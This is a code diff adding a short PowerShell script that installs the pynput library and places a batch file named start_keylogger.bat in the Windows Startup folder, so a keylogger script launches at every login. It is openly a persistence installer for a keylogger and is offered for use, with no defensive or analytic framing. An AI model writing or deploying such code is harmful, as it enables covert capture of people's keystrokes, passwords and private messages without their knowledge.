@@ -1,0 +1,23 @@
+# Install pynput if not already installed
+if (-not (Get-Command python)) {
+    Write-Host "Python is not installed. Please install Python and retry."
+    exit
+}
+
+# Check if pynput is installed, if not install it
+$command = "python -m pip show pynput"
+$pynput_installed = Invoke-Expression $command
+if (!$pynput_installed) {
+    Write-Host "Installing pynput..."
+    Invoke-Expression "python -m pip install pynput"
+}
+
+# Create the batch file
+$batchFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\start_keylogger.bat"
+$pythonFilePath = "C:\path\to\your\keylogger.py"  # Update this path
+
+$batchContent = "@echo off
+python $pythonFilePath"
+Set-Content -Path $batchFilePath -Value $batchContent
+
+Write-Host "Keylogger added to startup successfully."
